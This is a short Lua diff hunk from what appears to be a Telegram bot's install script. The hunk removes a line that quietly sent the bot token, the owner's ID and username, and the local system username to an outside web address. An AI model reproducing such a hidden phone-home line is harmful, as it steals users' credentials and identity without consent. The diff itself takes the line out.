@@ -58,7 +58,6 @@ create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://hso.mohammed-api.com/api/APIRenoo.php/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 print('\n\27[1;34m Hi Welcome To Source Boyka X ')
 file = io.open("Renoo", "w")  
 file:write([[
